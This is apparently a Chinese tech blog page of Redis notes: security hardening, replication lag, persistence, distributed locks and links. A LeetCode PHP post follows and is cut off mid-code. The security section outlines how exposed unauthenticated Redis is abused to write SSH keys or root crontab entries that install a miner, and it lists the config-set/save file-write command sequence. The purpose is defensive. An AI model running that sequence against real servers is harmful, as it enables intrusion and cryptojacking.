<h3 id="redis安全"><a href="#redis安全" class="headerlink" title="redis安全"></a>redis安全</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Redis 默认情况下，会绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，在没有利用防火墙进行屏蔽的情况下，将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下利用 Redis 的相关方法，可以成功将自己的公钥写入目标服务器的 ~<span class="regexp">/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器；如果 Redis 服务是以 root 权限启动，可以利用该问题直接获得服务器 root 权限。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">经过对捕获的事件进行分析，整个入侵流程大概是包含以下几个环节：</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">扫描开放 6379 端口的 Linux 服务器（后续感染扫描网段为 1.0.0.0/</span><span class="number">16</span> 到 <span class="number">224.255</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> ）</span><br><span class="line">通过 redis-cli 尝试连接 Redis 并执行预置在.dat 文件里的利用命令将 Redis 的数据文件修改为 /<span class="keyword">var</span>/spool/cron/root，然后通过在 Redis 中插入数据，将下载执行脚本的动作写入 crontab 任务</span><br><span class="line">通过脚本实现以上的相关行为，完成植入并启动挖矿程序</span><br><span class="line">Redis 服务加固</span><br><span class="line"></span><br><span class="line">导致入侵的主要原因是 Redis 未授权访问问题，所以如果要扼制入侵的入口，需要针对 Redis 服务进行加固，避免黑客通过该途径进行入侵植入挖矿蠕虫。</span><br><span class="line">如无必要，修改 bind 项，不要将 Redis 绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 上，避免 Redis 服务开放在外网，可以通过 iptables 或者腾讯云用户可以通过安全组限制访问来源</span><br><span class="line">在不影响业务的情况，不要以 root 启动 Redis 服务，同时建议修改默认的 <span class="number">6379</span> 端口，大部分针对 Redis 未授权问题的入侵都是针对默认端口进行的</span><br><span class="line">配置 AUTH，增加密码校验，这样即使开放在公网上，如果非弱口令的情况，黑客也无法访问 Redis 服务进行相关操作</span><br><span class="line">使用 rename-command CONFIG <span class="string">"RENAME_CONFIG"</span>重命名相关命令，这样黑客即使在连接上未授权问题的 Redis 服务，在不知道命令的情况下只能获取相关数据，而无法进一步利用 https:<span class="comment">//www.v2ex.com/t/584369</span></span><br><span class="line">docker 的 -p 如果直接 <span class="number">6379</span>:<span class="number">6379</span> 是会默认绑定 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 的，而且还会自动打开防火墙的这个端口，不注意很容易被坑的，必须要-p <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>:<span class="number">6379</span> 这样用才行</span><br><span class="line">Redis 也被挖矿攻击！ https:<span class="comment">//cn.v2ex.com/t/623847#reply27  </span></span><br><span class="line"><span class="comment">// 它这个脚本保存在 value 里，怎么才能被执行到  显然 redis 公网开放，并且无认证 如果 redis 被恶意程序访问到了，那么可以利用</span></span><br><span class="line"> </span><br><span class="line">config set dir xxx</span><br><span class="line">config set dbfilename xxxx</span><br><span class="line">set xxx</span><br><span class="line">save</span><br><span class="line"> </span><br><span class="line">这几条命令在 linux 目录下创建文件。 https:<span class="comment">//p0sec.net/index.php/archives/69/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-scard主从延时问题"><a href="#Redis-scard主从延时问题" class="headerlink" title="Redis scard主从延时问题"></a>Redis scard主从延时问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrize</span>(<span class="params">$arrPrizes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 真实的奖品是由上面的参数$arrPrizes传入，数据格式如下：</span></span><br><span class="line">        <span class="comment">// $arrPrizes = array(</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0001', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0002', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">// );</span></span><br><span class="line">        foreach ($arrPrizes <span class="keyword">as</span> $intIndex =&gt; $arrPrize) &#123;</span><br><span class="line">            $arrPrizes[$intIndex] = json_encode($arrPrize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取Redis实例</span></span><br><span class="line">        $objRedis       = RedisUtil::getInstance();</span><br><span class="line">        $strRedisKey    = <span class="string">'www.daemoncoder.com'</span>;</span><br><span class="line">        $arrPrizePages  = array_chunk($arrPrizes, <span class="number">100</span>);</span><br><span class="line">        foreach ($arrPrizePages <span class="keyword">as</span> $arrPrizePage) &#123;</span><br><span class="line">            <span class="comment">// 分批写入redis中</span></span><br><span class="line">            $intAddResult = $objRedis-&gt;sAddArray($strRedisKey, $arrPrizePage);</span><br><span class="line">            echo sprintf(<span class="string">"AddResult: %s\n"</span>, var_export($intAddResult, <span class="literal">true</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断写入的集合最终大小是否和传入的数组大小一致</span></span><br><span class="line">        <span class="comment">// 不一致则中间有数据没有成功写入，需要返回给上层重试或者报警</span></span><br><span class="line">        $intScardResult = $objRedis-&gt;sCard($strRedisKey);</span><br><span class="line">        echo sprintf(<span class="string">"ScardResult: %s\n"</span>, var_export($intScardResult, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> ($intScardResult == count($arrPrizes)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        var_dump($e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">通过sAddArray()写入集合的数据，有部分还没有生效。Redis本身用单线程处理请求，理论不应该存在出现这种延时，但是线上环境的Redis往往都是主从结构的，主库到从库同步数据是会有延时的，这也是出现这个问题的真实的原因。</span><br><span class="line">上述代码中用RedisUtil::getInstance()来获取redis实例，前面也有介绍，这个是我们自己封装的Redis工具类，会根据不同的redis命令做读写分离。sAddArray()是一个写请求，会自动选择主库连接执行，而sCard()是一个读请求，默认会选择从库去执行。所以会出现用sCard()读取不到集合真实的大小，因为从库此时可能还没有同步到最新的数据。</span><br><span class="line">解决方案</span><br><span class="line"></span><br><span class="line">调整代码，强制让sCard()方法选择主库（每个人连接的Redis工具类不同，这里不再贴代码，大概的方式就是连接时指定主库的IP）。这样经过多次反复测试，没有再出现这个问题。</span><br><span class="line">https:<span class="comment">//www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1Redis%20scard%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%AF%B9%E7%9A%84%E9%97%AE%E9%A2%98/4d54673d?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</span></span><br></pre></td></tr></table></figure>
<h3 id="redis数据持久化"><a href="#redis数据持久化" class="headerlink" title="redis数据持久化"></a>redis数据持久化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edis作为内存数据库，一共支持<span class="number">2</span>种数据持久化方案：RDB、AOF。这两种方案把数据存储到磁盘中，既可以同时使用，也可以单独使用，甚至都不使用，具体使用可以配置。</span><br><span class="line">把数据存储到磁盘主要是为了以后重用数据，或者防止系统出现故障而将数据备份到远程位置。</span><br><span class="line">rdb的主要原理是在某个时间点，把内存中所有的数据做一份快照，然后把快照中的数据保存在磁盘中。</span><br><span class="line">save 900 1     #900秒时间，至少有一条数据更新，则保存到数据文件中</span><br><span class="line">save 300 10    #300秒时间，至少有10条数据更新，则保存到数据文件中</span><br><span class="line">save 60 10000  #60秒时间，至少有10000条数据更新，则保存到数据文件中</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes 指定存储至本地数据库时是否压缩数据，默认是yes，redis采用LZF压缩，如果为了节省CPU时间可以关闭该选项，但会导致数据库文件扁的巨大</span><br><span class="line">rdbchecksum yes 对rdb文件进行校验</span><br><span class="line">dbfilename <span class="string">"dump.rdb"</span></span><br><span class="line">dir <span class="string">"XXX"</span></span><br><span class="line">当redis的bgsave命令触发时：会fork一个新进程，在新进程中进行处理快照的操作，主进程依旧可以执行别的请求。</span><br><span class="line"></span><br><span class="line">aof持久化是将被执行的写命令，写到aof文件的末尾，以此来记录数据的变化。</span><br><span class="line">appendonly no   #是否开启aof。默认是关闭的</span><br><span class="line"># appendfsync always       # always：表示每次redis写操作都会同步写入磁盘，这样会严重降低redis速度。</span><br><span class="line">appendfsync everysec       # everysec：表示每秒同步一次（折衷，默认值），通过redis的时间事件</span><br><span class="line"># appendfsync no     # no：表示redis不主动同步aof数据。等操作系统进行数据缓存同步到磁盘(快)</span><br><span class="line"></span><br><span class="line">其实redis的bgrewriteaof命令跟bgsave命令非常相似。都是创建一个子进程，把当前的数据创建一份快照，由子进程进行保存，然后替代以前的aof文件（并不是追加都文件末尾）。</span><br><span class="line">比较关心数据，但是可以忍受几分钟数据的丢失，可以使用rdb；</span><br><span class="line">不建议只使用aof：因为rdb文件是恢复数据、复制数据的最好的办法；</span><br><span class="line">如果对数据要求特别高，可以同时使用两种方案；</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/redis%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96_RDB_AOF/</span></span><br></pre></td></tr></table></figure>
<h3 id="基于redis实现分布式锁"><a href="#基于redis实现分布式锁" class="headerlink" title="基于redis实现分布式锁"></a>基于redis实现分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;multi();</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;EXPIRE($key,$time);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;exec();</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,<span class="number">1</span>,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,$random,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    <span class="keyword">if</span>($random == $<span class="keyword">this</span>-&gt;getCon()-&gt;get($key))&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> redis.call(<span class="string">"get"</span>,KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>] then</span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">"del"</span>,KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">end</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/%E5%9F%BA%E4%BA%8Eredis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</span></span><br></pre></td></tr></table></figure>
<p><a href="https://bettercuicui.github.io/2017/07/04/REDIS/redis%E8%BF%87%E6%9C%9F%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">redis过期数据存储方式以及删除方式</a></p>
<p><a href="https://bettercuicui.github.io/2018/04/01/REDIS/redis%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/#" target="_blank" rel="noopener">redis超时问题排查</a></p>
<p><a href="https://juejin.im/entry/5ba4eed3f265da0afc2bfb44" target="_blank" rel="noopener">分布式和redis</a></p>
<p><a href="https://learnku.com/articles/36375" target="_blank" rel="noopener">Redis 主从复制详细解读</a></p>
<p><a href="http://blog.13sai.com/essay/188" target="_blank" rel="noopener">从缓存穿透聊到布隆过滤器</a></p>
<p><a href="http://blog.13sai.com/essay/165" target="_blank" rel="noopener">基于redis的秒杀</a></p>
<p><a href="http://blog.13sai.com/essay/178" target="_blank" rel="noopener">Redis 为什么使用单进程单线程方式也这么快</a></p>
<p><a href="https://learnku.com/articles/24466" target="_blank" rel="noopener">面试时你可能需要的 Redis 知识技巧</a></p>
<p><a href="https://me.jinchuang.org/archives/430.html" target="_blank" rel="noopener">Redis 一站式管理平台工具ngbdf/redis-manager</a></p>
<p><a href="https://www.cnblogs.com/qingyunzong/p/9004509.html" target="_blank" rel="noopener">Kafka学习之路</a></p>
<p><a href="https://learnku.com/articles/33110" target="_blank" rel="noopener">redis限流</a></p>
<p><a href="https://learnku.com/articles/31068" target="_blank" rel="noopener">Redis &amp; 常用用法详情</a></p>
<p><a href="https://learnku.com/articles/30827" target="_blank" rel="noopener">Redis 应用-分布式锁</a></p>
<p><a href="https://github.com/mylxsw/redis-tui" target="_blank" rel="noopener">命令行的 Redis</a></p>
<p><a href="https://www.cnblogs.com/glon/p/6541709.html" target="_blank" rel="noopener">Redis 简单入门</a></p>
<p><a href="https://juejin.im/post/5cb13b4d6fb9a0687b7dd0bd" target="_blank" rel="noopener">50道Redis面试题史上最全</a></p>
<p><a href="https://shuwoom.com/?p=2563" target="_blank" rel="noopener">MYSQL性能优化学习笔记-(1)数据库设计</a></p>
<p><a href="https://learnku.com/articles/30214" target="_blank" rel="noopener">Redis In Action 笔记</a></p>
<p><a href="https://segmentfault.com/a/1190000017882763" target="_blank" rel="noopener">redis缓存雪崩、缓存穿透、缓存更新了解多少？github.com/ZhongFuCheng3y/3y</a></p>
<p><a href="https://learnku.com/articles/24802" target="_blank" rel="noopener">Redis 基础学习</a></p>
<p><a href="https://learnku.com/articles/31894" target="_blank" rel="noopener"> Redis bitmap 在微擎内做公众号的签到活动</a></p>
<p><a href="https://learnku.com/articles/29500" target="_blank" rel="noopener">Redis In Action 笔记</a></p>
<p><a href="https://juejin.im/post/5af5b2c36fb9a07ac65318bd" target="_blank" rel="noopener">使用缓存的正确姿势</a></p>
<p><a href="https://juejin.im/post/5b584831e51d45190d5556b2#heading-0" target="_blank" rel="noopener">Redis问题汇总</a></p>
<p><a href="https://learnku.com/articles/31351" target="_blank" rel="noopener">Redis 的第 n 次涉及</a></p>
<p><a href="https://my.oschina.net/editorial-story/blog/3052308?p=3" target="_blank" rel="noopener">epoll 的本质是什么</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/19/leetcode-题解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/19/leetcode-题解/" itemprop="url">leetcode 题解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-19T15:15:39+08:00">
                2019-03-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  494 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。</span><br><span class="line">给定 nums = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>], target = <span class="number">9</span></span><br><span class="line">因为 nums[<span class="number">0</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span></span><br><span class="line">所以返回 [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twoSum</span>(<span class="params">$nums, $target</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset($nums[<span class="number">1</span>])) <span class="keyword">return</span>;</span><br><span class="line">        foreach ($nums <span class="keyword">as</span> $key =&gt; $num) &#123;</span><br><span class="line">            unset($nums[$key]);</span><br><span class="line">            $result = array_search($target - $num, $nums);</span><br><span class="line">            <span class="keyword">if</span> ($result !== <span class="literal">false</span>) <span class="keyword">return</span> [$key, $result];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param String $J</span></span><br><span class="line"><span class="comment">     * @param String $S</span></span><br><span class="line"><span class="comment">     * @return Integer  https://learnku.com/articles/27545</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">numJewelsInStones</span>(<span class="params">$j, $s</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $jArr = str_split($j);</span><br><span class="line">        $sArr = str_split($s);</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        foreach($sArr <span class="keyword">as</span> $sItem)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array($sItem, $jArr))&#123;</span><br><span class="line">                $i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $i;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="在常数时间内检索到最小元素的栈"><a href="#在常数时间内检索到最小元素的栈" class="headerlink" title="在常数时间内检索到最小元素的栈"></a>在常数时间内检索到最小元素的栈</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $stack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * initialize your data structure here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param Integer $x</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack[] = $x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        array_pop($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">top</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> end($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Reverse-Integer"><a href="#Reverse-Integer" class="headerlink" title="Reverse Integer"></a>Reverse Integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">123</span></span><br><span class="line">输出: <span class="number">321</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">$x</span>) </span>&#123;</span><br><span class="line">        $result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (abs($x) &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            $num = $x % <span class="number">10</span>;</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">            $result = $result * <span class="number">10</span> + $num;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $result * <span class="number">10</span> + $x;</span><br><span class="line">        <span class="keyword">if</span> (strlen(base_convert($result, <span class="number">10</span>, <span class="number">2</span>)) &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">121</span></span><br><span class="line">输出: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">输入: <span class="number">-123</span></span><br><span class="line">输出: <span class="literal">false</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> ($x % <span class="number">10</span> === <span class="number">0</span> &amp;&amp; $x != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        $reverse = <span 